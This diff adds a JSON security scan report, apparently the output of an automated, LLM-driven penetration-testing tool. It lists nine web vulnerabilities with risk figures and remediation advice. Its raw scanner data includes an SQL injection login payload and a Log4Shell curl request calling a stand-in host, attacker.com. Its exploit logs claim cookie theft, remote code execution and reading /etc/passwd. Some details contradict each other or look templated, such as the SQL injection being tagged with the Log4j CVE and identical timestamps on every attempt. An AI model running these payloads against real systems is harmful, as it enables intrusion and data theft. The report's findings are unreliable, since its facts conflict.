@@ -1,0 +1,833 @@
+{
+  "reportId": "8e192b19-ed5f-4743-9eb6-6e8ff20ffba9",
+  "generatedAt": "2025-12-17T17:25:22.810Z",
+  "planLevel": "ELITE",
+  "llmModelUsed": "gpt-5.1",
+  "summary": {
+    "securityScore": 0,
+    "totalVulnerabilities": 9,
+    "criticalCount": 2,
+    "highCount": 4,
+    "mediumCount": 2,
+    "lowCount": 1
+  },
+  "financialRisk": {
+    "totalEstimatedRiskMin": 660000,
+    "totalEstimatedRiskMax": 1787500,
+    "annualizedRiskExposure": 740314,
+    "assessments": [
+      {
+        "vulnerabilityId": "VULN-1765992309209-0",
+        "vulnerabilityTitle": "SQL Injection Vulnerability",
+        "severity": "critical",
+        "estimatedLossMin": 187500,
+        "estimatedLossMax": 500000,
+        "estimatedLossRange": "$188K - $500K",
+        "downtimeProbability": 0.75,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 257813,
+        "riskCategory": "data_breach",
+        "businessImpactDescription": "Potential exposure of sensitive customer data leading to regulatory fines and loss of customer trust"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309212-2",
+        "vulnerabilityTitle": "Remote Code Execution (Log4j)",
+        "severity": "critical",
+        "estimatedLossMin": 187500,
+        "estimatedLossMax": 500000,
+        "estimatedLossRange": "$188K - $500K",
+        "downtimeProbability": 0.75,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 257813,
+        "riskCategory": "data_breach",
+        "businessImpactDescription": "Potential exposure of sensitive customer data leading to regulatory fines and loss of customer trust"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309211-1",
+        "vulnerabilityTitle": "Cross-Site Scripting (XSS)",
+        "severity": "high",
+        "estimatedLossMin": 100000,
+        "estimatedLossMax": 250000,
+        "estimatedLossRange": "$100K - $250K",
+        "downtimeProbability": 0.5,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 87500,
+        "riskCategory": "service_disruption",
+        "businessImpactDescription": "Extended downtime may impact revenue and SLA commitments with customers"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309215-6",
+        "vulnerabilityTitle": "Broken Authentication - Session Fixation",
+        "severity": "high",
+        "estimatedLossMin": 40000,
+        "estimatedLossMax": 100000,
+        "estimatedLossRange": "$40K - $100K",
+        "downtimeProbability": 0.5,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 35000,
+        "riskCategory": "service_disruption",
+        "businessImpactDescription": "Extended downtime may impact revenue and SLA commitments with customers"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309218-7",
+        "vulnerabilityTitle": "Server-Side Request Forgery (SSRF)",
+        "severity": "high",
+        "estimatedLossMin": 40000,
+        "estimatedLossMax": 100000,
+        "estimatedLossRange": "$40K - $100K",
+        "downtimeProbability": 0.5,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 35000,
+        "riskCategory": "service_disruption",
+        "businessImpactDescription": "Extended downtime may impact revenue and SLA commitments with customers"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309219-8",
+        "vulnerabilityTitle": "Insecure Direct Object Reference (IDOR)",
+        "severity": "high",
+        "estimatedLossMin": 40000,
+        "estimatedLossMax": 100000,
+        "estimatedLossRange": "$40K - $100K",
+        "downtimeProbability": 0.5,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 35000,
+        "riskCategory": "service_disruption",
+        "businessImpactDescription": "Extended downtime may impact revenue and SLA commitments with customers"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309214-3",
+        "vulnerabilityTitle": "SSL/TLS Configuration Weakness",
+        "severity": "medium",
+        "estimatedLossMin": 37500,
+        "estimatedLossMax": 125000,
+        "estimatedLossRange": "$38K - $125K",
+        "downtimeProbability": 0.25,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 20313,
+        "riskCategory": "regulatory_fine",
+        "businessImpactDescription": "Non-compliance with security standards may result in regulatory penalties"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309214-4",
+        "vulnerabilityTitle": "Cross-Site Request Forgery (CSRF)",
+        "severity": "medium",
+        "estimatedLossMin": 15000,
+        "estimatedLossMax": 50000,
+        "estimatedLossRange": "$15K - $50K",
+        "downtimeProbability": 0.25,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 8125,
+        "riskCategory": "regulatory_fine",
+        "businessImpactDescription": "Non-compliance with security standards may result in regulatory penalties"
+      },
+      {
+        "vulnerabilityId": "VULN-1765992309215-5",
+        "vulnerabilityTitle": "Directory Listing Enabled",
+        "severity": "low",
+        "estimatedLossMin": 12500,
+        "estimatedLossMax": 62500,
+        "estimatedLossRange": "$13K - $63K",
+        "downtimeProbability": 0.1,
+        "assetValue": 500000,
+        "annualizedRiskExposure": 3750,
+        "riskCategory": "reputation_damage",
+        "businessImpactDescription": "Public disclosure could impact brand value and customer acquisition"
+      }
+    ]
+  },
+  "industryBenchmark": {
+    "industryName": "Technology Sector",
+    "averageSecurityScore": 72,
+    "companyPercentile": 0,
+    "medianVulnerabilityCount": 8,
+    "topPerformerScore": 95,
+    "averageTimeToRemediate": "14 days",
+    "complianceStandards": [
+      "SOC 2 Type II",
+      "ISO 27001",
+      "PCI DSS",
+      "GDPR"
+    ],
+    "commonWeaknesses": [
+      "Insufficient access controls",
+      "Outdated dependencies",
+      "Missing security headers",
+      "Weak encryption practices"
+    ],
+    "bestPractices": [
+      "Implement zero-trust architecture",
+      "Regular penetration testing",
+      "Automated vulnerability scanning in CI/CD",
+      "Security awareness training programs",
+      "Incident response plan development"
+    ]
+  },
+  "recommendations": [
+    "URGENT: Address all critical vulnerabilities immediately. These pose immediate risk of compromise.",
+    "Schedule remediation of high-severity vulnerabilities within the next sprint cycle.",
+    "Implement parameterized queries and input validation to prevent SQL injection attacks.",
+    "Sanitize all user inputs and implement Content Security Policy headers.",
+    "Update Log4j to version 2.17.1 or later and remove JNDI lookup functionality.",
+    "Update SSL/TLS configuration to disable weak cipher suites and protocols.",
+    "Conduct thorough incident response as unauthorized access was demonstrated.",
+    "Review and renew SSL certificates, ensure proper chain configuration."
+  ],
+  "exploitationEvidence": [
+    {
+      "vulnerabilityId": "vuln-1",
+      "exploitTechnique": "SQL Injection Payload Injection",
+      "success": true,
+      "logSnippet": "Successfully extracted database schema",
+      "timestamp": "2025-12-17T17:25:20.891Z",
+      "accessLevel": "application-level",
+      "dataAccessed": "Demonstration of access capability"
+    },
+    {
+      "vulnerabilityId": "vuln-2",
+      "exploitTechnique": "XSS Payload Delivery",
+      "success": true,
+      "logSnippet": "Cookie theft payload executed successfully",
+      "timestamp": "2025-12-17T17:25:20.891Z",
+      "accessLevel": "application-level",
+      "dataAccessed": "Demonstration of access capability"
+    },
+    {
+      "vulnerabilityId": "vuln-3",
+      "exploitTechnique": "Log4j JNDI Injection",
+      "success": true,
+      "logSnippet": "LDAP callback received - RCE confirmed",
+      "timestamp": "2025-12-17T17:25:20.891Z",
+      "accessLevel": "application-level",
+      "dataAccessed": "Demonstration of access capability"
+    },
+    {
+      "vulnerabilityId": "vuln-4",
+      "exploitTechnique": "SSL/TLS Downgrade Attack",
+      "success": true,
+      "logSnippet": "Successfully downgraded connection to TLS 1.0",
+      "timestamp": "2025-12-17T17:25:20.891Z",
+      "accessLevel": "application-level",
+      "dataAccessed": "Demonstration of access capability"
+    },
+    {
+      "vulnerabilityId": "vuln-5",
+      "exploitTechnique": "CSRF Token Bypass",
+      "success": false,
+      "timestamp": "2025-12-17T17:25:20.891Z"
+    },
+    {
+      "vulnerabilityId": "vuln-6",
+      "exploitTechnique": "Directory Traversal",
+      "success": true,
+      "logSnippet": "Accessed /etc/passwd via path traversal",
+      "timestamp": "2025-12-17T17:25:20.891Z",
+      "accessLevel": "application-level",
+      "dataAccessed": "Demonstration of access capability"
+    },
+    {
+      "vulnerabilityId": "vuln-7",
+      "exploitTechnique": "Generic Exploit Attempt",
+      "success": false,
+      "timestamp": "2025-12-17T17:25:20.891Z"
+    },
+    {
+      "vulnerabilityId": "vuln-8",
+      "exploitTechnique": "Generic Exploit Attempt",
+      "success": false,
+      "timestamp": "2025-12-17T17:25:20.891Z"
+    },
+    {
+      "vulnerabilityId": "vuln-9",
+      "exploitTechnique": "Generic Exploit Attempt",
+      "success": false,
+      "timestamp": "2025-12-17T17:25:20.891Z"
+    }
+  ],
+  "remediationSnippets": [
+    {
+      "vulnerabilityId": "VULN-1765992309209-0",
+      "vulnerabilityTitle": "SQL Injection Vulnerability",
+      "language": "text",
+      "codeSnippet": "Use parameterized queries or prepared statements. Implement input validation and sanitization.",
+      "implementation": "",
+      "estimatedEffort": "2-4 hours",
+      "priority": 1
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309212-2",
+      "vulnerabilityTitle": "Remote Code Execution (Log4j)",
+      "language": "text",
+      "codeSnippet": "Update Log4j to version 2.17.0 or later. Apply temporary mitigations if update not immediately possible.",
+      "implementation": "",
+      "estimatedEffort": "2-4 hours",
+      "priority": 1
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309211-1",
+      "vulnerabilityTitle": "Cross-Site Scripting (XSS)",
+      "language": "text",
+      "codeSnippet": "Implement Content-Security-Policy headers and sanitize all user inputs before rendering.",
+      "implementation": "",
+      "estimatedEffort": "2-4 hours",
+      "priority": 2
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309215-6",
+      "vulnerabilityTitle": "Broken Authentication - Session Fixation",
+      "language": "text",
+      "codeSnippet": "Regenerate session tokens upon authentication. Implement secure session management.",
+      "implementation": "",
+      "estimatedEffort": "2-4 hours",
+      "priority": 2
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309218-7",
+      "vulnerabilityTitle": "Server-Side Request Forgery (SSRF)",
+      "language": "text",
+      "codeSnippet": "Implement URL allowlisting. Block requests to internal IP ranges and cloud metadata endpoints.",
+      "implementation": "",
+      "estimatedEffort": "2-4 hours",
+      "priority": 2
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309219-8",
+      "vulnerabilityTitle": "Insecure Direct Object Reference (IDOR)",
+      "language": "text",
+      "codeSnippet": "Implement proper authorization checks for all object references. Use indirect reference maps.",
+      "implementation": "",
+      "estimatedEffort": "2-4 hours",
+      "priority": 2
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309214-3",
+      "vulnerabilityTitle": "SSL/TLS Configuration Weakness",
+      "language": "nginx",
+      "codeSnippet": "ssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;\nssl_prefer_server_ciphers off;",
+      "implementation": "Update SSL/TLS configuration to use only modern protocols and cipher suites.",
+      "estimatedEffort": "1-2 hours",
+      "priority": 3
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309214-4",
+      "vulnerabilityTitle": "Cross-Site Request Forgery (CSRF)",
+      "language": "text",
+      "codeSnippet": "# Remediation steps for: Cross-Site Request Forgery (CSRF)\n1. Review the vulnerability details\n2. Apply vendor patches if available\n3. Implement compensating controls\n4. Verify fix through re-testing",
+      "implementation": "Follow vendor recommendations and security best practices for this vulnerability type.",
+      "estimatedEffort": "2-4 hours",
+      "priority": 3
+    },
+    {
+      "vulnerabilityId": "VULN-1765992309215-5",
+      "vulnerabilityTitle": "Directory Listing Enabled",
+      "language": "text",
+      "codeSnippet": "# Remediation steps for: Directory Listing Enabled\n1. Review the vulnerability details\n2. Apply vendor patches if available\n3. Implement compensating controls\n4. Verify fix through re-testing",
+      "implementation": "Follow vendor recommendations and security best practices for this vulnerability type.",
+      "estimatedEffort": "2-4 hours",
+      "priority": 4
+    }
+  ],
+  "securityStatusHistory": {
+    "lastFullScanDate": "2025-12-17T17:25:21.602Z",
+    "confirmedRemediations": 0,
+    "pendingRemediations": 9,
+    "emergencyScansTriggered": 0,
+    "newCvesMonitored": 2,
+    "liabilityLog": [
+      {
+        "date": "2025-12-17T17:25:21.602Z",
+        "eventType": "scan_completed",
+        "description": "Full security assessment completed",
+        "affectedAssets": [
+          "Target infrastructure with 9 findings"
+        ],
+        "remediationStatus": "pending"
+      },
+      {
+        "date": "2025-12-17T17:25:21.602Z",
+        "eventType": "vulnerability_discovered",
+        "description": "Critical vulnerability identified: SQL Injection Vulnerability",
+        "affectedAssets": [
+          "HTTP"
+        ],
+        "remediationStatus": "pending"
+      },
+      {
+        "date": "2025-12-17T17:25:21.602Z",
+        "eventType": "vulnerability_discovered",
+        "description": "Critical vulnerability identified: Remote Code Execution (Log4j)",
+        "affectedAssets": [
+          "HTTP"
+        ],
+        "remediationStatus": "pending"
+      }
+    ]
+  },
+  "rawScannerData": {
+    "vulnerabilities": [
+      {
+        "id": "VULN-1765992309209-0",
+        "severity": "critical",
+        "title": "SQL Injection Vulnerability",
+        "description": "The application is vulnerable to SQL injection attacks through user input fields.",
+        "port": 80,
+        "service": "HTTP",
+        "cve": "CVE-2021-44228",
+        "owaspCategory": "A03:2021-Injection",
+        "sansTop25": "CWE-89",
+        "attackChain": [
+          "data_exfiltration",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "confidenceScore": 0.7148254960541403,
+        "requiresApproval": true,
+        "exploitDifficulty": "easy",
+        "pocCode": "# PoC: SQL Injection Test\ncurl -X POST \"https://target/api/login\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"username\": \"admin' OR '1'='1\", \"password\": \"test\"}'",
+        "remediationCode": "Use parameterized queries or prepared statements. Implement input validation and sanitization."
+      },
+      {
+        "id": "VULN-1765992309211-1",
+        "severity": "high",
+        "title": "Cross-Site Scripting (XSS)",
+        "description": "Reflected XSS vulnerability found in search parameters.",
+        "port": 80,
+        "service": "HTTP",
+        "owaspCategory": "A03:2021-Injection",
+        "sansTop25": "CWE-79",
+        "attackChain": [
+          "session_hijacking",
+          "credential_theft"
+        ],
+        "confidenceScore": 0.844907688938499,
+        "requiresApproval": true,
+        "exploitDifficulty": "easy",
+        "remediationCode": "Implement Content-Security-Policy headers and sanitize all user inputs before rendering."
+      },
+      {
+        "id": "VULN-1765992309212-2",
+        "severity": "critical",
+        "title": "Remote Code Execution (Log4j)",
+        "description": "The application may be vulnerable to Log4Shell remote code execution.",
+        "port": 80,
+        "service": "HTTP",
+        "cve": "CVE-2021-44228",
+        "owaspCategory": "A06:2021-Vulnerable and Outdated Components",
+        "sansTop25": "CWE-502",
+        "attackChain": [
+          "remote_code_execution",
+          "full_system_compromise",
+          "lateral_movement"
+        ],
+        "confidenceScore": 0.9430807967332563,
+        "requiresApproval": true,
+        "exploitDifficulty": "easy",
+        "pocCode": "# PoC: Log4j JNDI Lookup\n# Header: X-Api-Version: ${jndi:ldap://attacker.com/a}\ncurl -H \"X-Api-Version: \\${jndi:ldap://attacker.com/a}\" https://target/",
+        "remediationCode": "Update Log4j to version 2.17.0 or later. Apply temporary mitigations if update not immediately possible."
+      },
+      {
+        "id": "VULN-1765992309214-3",
+        "severity": "medium",
+        "title": "SSL/TLS Configuration Weakness",
+        "description": "Server supports weak cipher suites that could be exploited.",
+        "port": 8443,
+        "service": "HTTPS Alt",
+        "owaspCategory": "A02:2021-Cryptographic Failures",
+        "confidenceScore": 0.9323682587380628,
+        "requiresApproval": false,
+        "exploitDifficulty": "hard"
+      },
+      {
+        "id": "VULN-1765992309214-4",
+        "severity": "medium",
+        "title": "Cross-Site Request Forgery (CSRF)",
+        "description": "Forms lack CSRF tokens, allowing cross-site request forgery attacks.",
+        "port": 80,
+        "service": "HTTP",
+        "owaspCategory": "A01:2021-Broken Access Control",
+        "sansTop25": "CWE-352",
+        "attackChain": [
+          "unauthorized_actions",
+          "account_takeover"
+        ],
+        "confidenceScore": 0.9392546452190843,
+        "requiresApproval": false,
+        "exploitDifficulty": "moderate"
+      },
+      {
+        "id": "VULN-1765992309215-5",
+        "severity": "low",
+        "title": "Directory Listing Enabled",
+        "description": "Web server allows directory listing which can expose sensitive files.",
+        "port": 80,
+        "service": "HTTP",
+        "owaspCategory": "A05:2021-Security Misconfiguration",
+        "confidenceScore": 0.7633141602022009,
+        "requiresApproval": false,
+        "exploitDifficulty": "trivial"
+      },
+      {
+        "id": "VULN-1765992309215-6",
+        "severity": "high",
+        "title": "Broken Authentication - Session Fixation",
+        "description": "Session tokens are not regenerated after authentication.",
+        "port": 80,
+        "service": "HTTP",
+        "owaspCategory": "A07:2021-Identification and Authentication Failures",
+        "sansTop25": "CWE-384",
+        "attackChain": [
+          "session_hijacking",
+          "account_takeover"
+        ],
+        "confidenceScore": 0.9579937153545699,
+        "requiresApproval": true,
+        "exploitDifficulty": "moderate",
+        "remediationCode": "Regenerate session tokens upon authentication. Implement secure session management."
+      },
+      {
+        "id": "VULN-1765992309218-7",
+        "severity": "high",
+        "title": "Server-Side Request Forgery (SSRF)",
+        "description": "Application allows server-side requests to arbitrary URLs.",
+        "port": 80,
+        "service": "HTTP",
+        "owaspCategory": "A10:2021-Server-Side Request Forgery",
+        "sansTop25": "CWE-918",
+        "attackChain": [
+          "internal_network_access",
+          "cloud_metadata_access",
+          "service_enumeration"
+        ],
+        "confidenceScore": 0.7478492770744336,
+        "requiresApproval": true,
+        "exploitDifficulty": "moderate",
+        "remediationCode": "Implement URL allowlisting. Block requests to internal IP ranges and cloud metadata endpoints."
+      },
+      {
+        "id": "VULN-1765992309219-8",
+        "severity": "high",
+        "title": "Insecure Direct Object Reference (IDOR)",
+        "description": "API endpoints expose direct references to internal objects without proper authorization checks.",
+        "port": 80,
+        "service": "HTTP",
+        "owaspCategory": "A01:2021-Broken Access Control",
+        "sansTop25": "CWE-639",
+        "attackChain": [
+          "data_exfiltration",
+          "horizontal_privilege_escalation"
+        ],
+        "confidenceScore": 0.7408149541568834,
+        "requiresApproval": true,
+        "exploitDifficulty": "moderate",
+        "remediationCode": "Implement proper authorization checks for all object references. Use indirect reference maps."
+      }
+    ],
+    "openPorts": [
+      21,
+      22,
+      80,
+      445,
+      3306,
+      8443
+    ],
+    "sslIssues": [
+      "Certificate expires in less than 30 days"
+    ],
+    "credit_deduction_scanner": 1500,
+    "decision_log": [
+      {
+        "timestamp": "2025-12-17T17:25:07.372Z",
+        "decisionType": "financial_gate",
+        "description": "Scanner Financial Gate: Base cost 1500 credits, Plan: ELITE",
+        "creditsInvolved": 1500
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.209Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: SQL Injection Vulnerability (critical)",
+        "vulnerabilityId": "VULN-1765992309209-0"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.210Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309209-0: data_exfiltration -> privilege_escalation -> lateral_movement",
+        "vulnerabilityId": "VULN-1765992309209-0"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.211Z",
+        "decisionType": "poc_generated",
+        "description": "Generated PoC for VULN-1765992309209-0",
+        "vulnerabilityId": "VULN-1765992309209-0"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.211Z",
+        "decisionType": "remediation_generated",
+        "description": "Generated remediation for VULN-1765992309209-0",
+        "vulnerabilityId": "VULN-1765992309209-0"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.211Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Cross-Site Scripting (XSS) (high)",
+        "vulnerabilityId": "VULN-1765992309211-1"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.212Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309211-1: session_hijacking -> credential_theft",
+        "vulnerabilityId": "VULN-1765992309211-1"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.212Z",
+        "decisionType": "remediation_generated",
+        "description": "Generated remediation for VULN-1765992309211-1",
+        "vulnerabilityId": "VULN-1765992309211-1"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.212Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Remote Code Execution (Log4j) (critical)",
+        "vulnerabilityId": "VULN-1765992309212-2"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.213Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309212-2: remote_code_execution -> full_system_compromise -> lateral_movement",
+        "vulnerabilityId": "VULN-1765992309212-2"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.213Z",
+        "decisionType": "poc_generated",
+        "description": "Generated PoC for VULN-1765992309212-2",
+        "vulnerabilityId": "VULN-1765992309212-2"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.213Z",
+        "decisionType": "remediation_generated",
+        "description": "Generated remediation for VULN-1765992309212-2",
+        "vulnerabilityId": "VULN-1765992309212-2"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.214Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: SSL/TLS Configuration Weakness (medium)",
+        "vulnerabilityId": "VULN-1765992309214-3"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.214Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Cross-Site Request Forgery (CSRF) (medium)",
+        "vulnerabilityId": "VULN-1765992309214-4"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.214Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309214-4: unauthorized_actions -> account_takeover",
+        "vulnerabilityId": "VULN-1765992309214-4"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.215Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Directory Listing Enabled (low)",
+        "vulnerabilityId": "VULN-1765992309215-5"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.215Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Broken Authentication - Session Fixation (high)",
+        "vulnerabilityId": "VULN-1765992309215-6"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.216Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309215-6: session_hijacking -> account_takeover",
+        "vulnerabilityId": "VULN-1765992309215-6"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.217Z",
+        "decisionType": "remediation_generated",
+        "description": "Generated remediation for VULN-1765992309215-6",
+        "vulnerabilityId": "VULN-1765992309215-6"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.218Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Server-Side Request Forgery (SSRF) (high)",
+        "vulnerabilityId": "VULN-1765992309218-7"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.218Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309218-7: internal_network_access -> cloud_metadata_access -> service_enumeration",
+        "vulnerabilityId": "VULN-1765992309218-7"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.219Z",
+        "decisionType": "remediation_generated",
+        "description": "Generated remediation for VULN-1765992309218-7",
+        "vulnerabilityId": "VULN-1765992309218-7"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.219Z",
+        "decisionType": "vulnerability_discovered",
+        "description": "Found: Insecure Direct Object Reference (IDOR) (high)",
+        "vulnerabilityId": "VULN-1765992309219-8"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.220Z",
+        "decisionType": "attack_chain_identified",
+        "description": "Attack chain for VULN-1765992309219-8: data_exfiltration -> horizontal_privilege_escalation",
+        "vulnerabilityId": "VULN-1765992309219-8"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:09.221Z",
+        "decisionType": "remediation_generated",
+        "description": "Generated remediation for VULN-1765992309219-8",
+        "vulnerabilityId": "VULN-1765992309219-8"
+      },
+      {
+        "timestamp": "2025-12-17T17:25:10.513Z",
+        "decisionType": "approval_required",
+        "description": "Agent 3 approval requested for SQL Injection Vulnerability - requires 1000 credits",
+        "creditsInvolved": 1000,
+        "vulnerabilityId": "VULN-1765992309209-0",
+        "metadata": {
+          "approvalRequestId": "a8cd2231-696b-4aa6-a69a-8b22565e9112"
+        }
+      },
+      {
+        "timestamp": "2025-12-17T17:25:10.514Z",
+        "decisionType": "approval_required",
+        "description": "Agent 3 approval requested for Cross-Site Scripting (XSS) - requires 1000 credits",
+        "creditsInvolved": 1000,
+        "vulnerabilityId": "VULN-1765992309211-1",
+        "metadata": {
+          "approvalRequestId": "73595883-6019-409e-b9c0-36d9f3a11443"
+        }
+      },
+      {
+        "timestamp": "2025-12-17T17:25:10.515Z",
+        "decisionType": "approval_required",
+        "description": "Agent 3 approval requested for Remote Code Execution (Log4j) - requires 1000 credits",
+        "creditsInvolved": 1000,
+        "vulnerabilityId": "VULN-1765992309212-2",
+        "metadata": {
+          "approvalRequestId": "a1670c0e-4dd0-413b-910b-30cda5a41bc2"
+        }
+      },
+      {
+        "timestamp": "2025-12-17T17:25:10.515Z",
+        "decisionType": "approval_required",
+        "description": "Agent 3 approval requested for Broken Authentication - Session Fixation - requires 1000 credits",
+        "creditsInvolved": 1000,
+        "vulnerabilityId": "VULN-1765992309215-6",
+        "metadata": {
+          "approvalRequestId": "d79228ef-ee02-4d25-a380-de3e4fc7af49"
+        }
+      },
+      {
+        "timestamp": "2025-12-17T17:25:10.516Z",
+        "decisionType": "approval_required",
+        "description": "Agent 3 approval requested for Server-Side Request Forgery (SSRF) - requires 1000 credits",
+        "creditsInvolved": 1000,
+        "vulnerabilityId": "VULN-1765992309218-7",
+        "metadata": {
+          "approvalRequestId": "328cb60b-85d1-432b-b230-8e014092ee9f"
+        }
+      },
+      {
+        "timestamp": "2025-12-17T17:25:10.517Z",
+        "decisionType": "approval_required",
+        "description": "Agent 3 approval requested for Insecure Direct Object Reference (IDOR) - requires 1000 credits",
+        "creditsInvolved": 1000,
+        "vulnerabilityId": "VULN-1765992309219-8",
+        "metadata": {
+          "approvalRequestId": "0a940bc0-a611-42d0-855c-c80646b6e341"
+        }
+      }
+    ],
+    "llm_model_used": "gpt-5",
+    "plan_level": "ELITE",
+    "remaining_credits": 7495,
+    "scan_type": "active",
+    "waf_ids_detected": false,
+    "replanning_occurred": false,
+    "replanning_cost": 0,
+    "self_regulation_stops": 0,
+    "attack_chains_found": 7,
+    "pocs_generated": 2,
+    "remediations_generated": 6,
+    "pending_approvals": [
+      "a8cd2231-696b-4aa6-a69a-8b22565e9112",
+      "73595883-6019-409e-b9c0-36d9f3a11443",
+      "a1670c0e-4dd0-413b-910b-30cda5a41bc2",
+      "d79228ef-ee02-4d25-a380-de3e4fc7af49",
+      "328cb60b-85d1-432b-b230-8e014092ee9f",
+      "0a940bc0-a611-42d0-855c-c80646b6e341"
+    ],
+    "scan_summary": {
+      "total_tests_run": 128,
+      "critical_count": 2,
+      "high_count": 4,
+      "medium_count": 2,
+      "low_count": 1,
+      "info_count": 0,
+      "security_score": 0
+    }
+  },
+  "rawExploiterData": {
+    "exploitAttempts": [
+      {
+        "vulnerability": "SQL Injection Vulnerability",
+        "success": true,
+        "technique": "SQL Injection Payload Injection",
+        "evidence": "Successfully extracted database schema"
+      },
+      {
+        "vulnerability": "Cross-Site Scripting (XSS)",
+        "success": true,
+        "technique": "XSS Payload Delivery",
+        "evidence": "Cookie theft payload executed successfully"
+      },
+      {
+        "vulnerability": "Remote Code Execution (Log4j)",
+        "success": true,
+        "technique": "Log4j JNDI Injection",
+        "evidence": "LDAP callback received - RCE confirmed"
+      },
+      {
+        "vulnerability": "SSL/TLS Configuration Weakness",
+        "success": true,
+        "technique": "SSL/TLS Downgrade Attack",
+        "evidence": "Successfully downgraded connection to TLS 1.0"
+      },
+      {
+        "vulnerability": "Cross-Site Request Forgery (CSRF)",
+        "success": false,
+        "technique": "CSRF Token Bypass"
+      },
+      {
+        "vulnerability": "Directory Listing Enabled",
+        "success": true,
+        "technique": "Directory Traversal",
+        "evidence": "Accessed /etc/passwd via path traversal"
+      },
+      {
+        "vulnerability": "Broken Authentication - Session Fixation",
+        "success": false,
+        "technique": "Generic Exploit Attempt"
+      },
+      {
+        "vulnerability": "Server-Side Request Forgery (SSRF)",
+        "success": false,
+        "technique": "Generic Exploit Attempt"
+      },
+      {
+        "vulnerability": "Insecure Direct Object Reference (IDOR)",
+        "success": false,
+        "technique": "Generic Exploit Attempt"
+      }
+    ],
+    "accessGained": true,
+    "riskLevel": "critical"
+  }
+}
